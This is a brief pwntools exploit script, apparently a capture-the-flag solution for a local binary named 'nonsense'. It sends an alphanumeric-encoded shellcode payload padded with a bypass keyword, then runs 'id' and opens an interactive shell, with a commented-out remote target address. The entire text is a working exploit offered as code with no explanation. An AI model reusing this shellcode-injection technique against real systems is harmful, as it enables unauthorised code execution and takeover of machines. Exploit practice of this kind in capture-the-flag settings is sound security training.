from pwn import *
context.log_level = 'DEBUG'
context.arch = 'amd64'
# p=remote("60.250.197.227",10001)

r=process('./nonsense')
# shell = shellcraft.sh()
nonsense = "wubbalubbadubdub"

payload = "RRYh00AAX1A0hA004X1A4hA00AX1A8QX4tPj0X40PZPjAX4znoNDnRYZnCXA"

name = "haha"
payload += nonsense

r.sendafter("?", name)
r.sendafter("?", payload+nonsense)
time.sleep(0.5)
r.sendline("id")
r.interactive()
